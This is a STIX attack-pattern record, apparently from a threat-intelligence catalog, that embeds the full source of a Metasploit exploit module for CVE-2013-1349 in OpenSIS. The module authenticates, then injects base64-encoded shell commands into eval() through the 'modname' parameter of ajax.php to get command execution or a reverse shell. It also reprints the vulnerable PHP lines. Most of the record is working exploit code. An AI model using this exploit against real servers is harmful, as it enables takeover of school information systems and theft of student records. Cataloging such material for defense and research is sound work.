{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2c01c6ba-175f-4f0a-9b1e-19a9a2a0196b",
    "created": "2024-08-14T17:12:00.16438Z",
    "modified": "2024-08-14T17:12:00.164383Z",
    "name": "\"OpenSIS modname PHP Code Execution\"",
    "description": " This module exploits a PHP code execution vulnerability in OpenSIS versions 4.5 to 5.2 which allows any authenticated user to execute arbitrary PHP code under the context of the web-server user. The 'ajax.php' file calls 'eval()' with user controlled data from the 'modname' parameter.  'License'           => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/opensis_modname_exec.rb",
            "external_id": "opensis_modname_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1349"
        },
        {
            "source_name": "reference",
            "url": "http://karmainsecurity.com/KIS-2013-10"
        },
        {
            "source_name": "reference",
            "url": "http://sourceforge.net/p/opensis-ce/bugs/59/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'              => \"OpenSIS 'modname' PHP Code Execution\",\n      'Description'       => %q{\n        This module exploits a PHP code execution vulnerability in OpenSIS\n        versions 4.5 to 5.2 which allows any authenticated user to execute\n        arbitrary PHP code under the context of the web-server user.\n        The 'ajax.php' file calls 'eval()' with user controlled data from\n        the 'modname' parameter.\n      },\n      'License'           => MSF_LICENSE,\n      'Author'            =>\n        [\n          'EgiX', # Discovery\n          'bcoles' # msf exploit\n        ],\n      'References'        =>\n        [\n          ['CVE',   '2013-1349'],\n          ['OSVDB', '100676'],\n          ['URL',   'http://karmainsecurity.com/KIS-2013-10'],\n          ['URL',   'http://sourceforge.net/p/opensis-ce/bugs/59/']\n        ],\n      'Payload'           =>\n        {\n          'BadChars'      => \"\\x00\\x0a\\x0d\",\n          'Compat'        =>\n            {\n            'PayloadType' => 'cmd',\n            'RequiredCmd' => 'generic telnet netcat netcat-e perl ruby python',\n            }\n        },\n      'DefaultOptions'    =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'          => 'unix',\n      'Arch'              => ARCH_CMD,\n      'Targets'           =>\n        [\n          # Tested on OpenSIS versions 4.9 and 5.2 (Ubuntu Linux)\n          ['OpenSIS version 4.5 to 5.2', { 'auto' => true }]\n        ],\n      'Privileged'        => false,\n      'DisclosureDate'    => '2012-12-04',\n      'DefaultTarget'     => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The URI for OpenSIS', '/opensis/']),\n        OptString.new('USERNAME',  [true, 'The username for OpenSIS']),\n        OptString.new('PASSWORD',  [true, 'The password for OpenSIS'])\n      ])\n  end\n\n  #\n  # Login\n  #\n  def login(user, pass)\n    @cookie = \"PHPSESSID=#{rand_text_alphanumeric(rand(10)+10)};\"\n    print_status(\"Authenticating as user '#{user}'\")\n    res = send_request_cgi({\n      'method'     => 'POST',\n      'uri'        => normalize_uri(target_uri.path, \"index.php\"),\n      'cookie'     => @cookie,\n      'vars_post'  => Hash[{\n        'USERNAME' => user,\n        'PASSWORD' => pass,\n      }.to_a.shuffle]\n    })\n    if res and res.code == 200 and res.body =~ /Portal\\.php/\n      print_good(\"Authenticated as user '#{user}'\")\n      return true\n    else\n      print_error(\"Authenticating as user '#{user}' failed\")\n      return false\n    end\n  end\n\n  #\n  # Send command for execution\n  #\n  def execute_command(cmd, opts = { :php_function => 'system' } )\n    code = Rex::Text.uri_encode(Rex::Text.encode_base64(cmd+\"&\"))\n    junk = rand_text_alphanumeric(rand(10)+6)\n    print_status(\"Sending payload (#{code.length} bytes)\")\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'ajax.php'),\n      'cookie'    => @cookie,\n      'vars_post' => {\n        'modname' => \"#{junk}?#{junk}=#{junk}';#{opts[:php_function]}(base64_decode('#{code}'));//\"\n      }\n    })\n    return res\n  end\n\n  #\n  # Check credentials are valid and confirm command execution\n  #\n  def check\n    return Exploit::CheckCode::Unknown unless login(datastore['USERNAME'], datastore['PASSWORD'])\n    fingerprint = Rex::Text.rand_text_alphanumeric(rand(10)+10)\n    vprint_status(\"Sending check\")\n    res = execute_command(\"echo #{fingerprint}\")\n    if res and res.body =~ /align=center>#{fingerprint}/\n      return Exploit::CheckCode::Vulnerable\n    elsif res\n      return Exploit::CheckCode::Safe\n    end\n    return Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    return unless login(datastore['USERNAME'], datastore['PASSWORD'])\n    php_function = [\n      'exec',\n      'shell_exec',\n      'passthru',\n      'system'\n    ].sample\n    res = execute_command(payload.encoded, { :php_function => php_function })\n    if res and res.code == 200 and res.body =~ /hacking_log/i\n      print_good(\"Payload sent successfully\")\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Sending payload failed\")\n    end\n  end\nend\n\n#\n# Source\n#\n=begin ajax.php\n90:\tif(strpos($_REQUEST['modname'],'?')!==false)\n91:\t{\n92:\t\t$vars = substr($_REQUEST['modname'],(strpos($_REQUEST['modname'],'?')+1));\n93:\t\t$modname = substr($_REQUEST['modname'],0,strpos($_REQUEST['modname'],'?'));\n94:\n95:\t\t$vars = explode('?',$vars);\n96:\t\tforeach($vars as $code)\n97:\t\t{\n98:\t\t\t$code = decode_unicode_url(\"\\$_REQUEST['\".str_replace('=',\"']='\",$code).\"';\");\n99:\t\t\teval($code);\n100:\t\t}\n101:\t}\n=end\n",
    "x_mitre_disclosure_date": "2012-12-04",
    "x_mitre_platforms": [
        "unix'"
    ]
}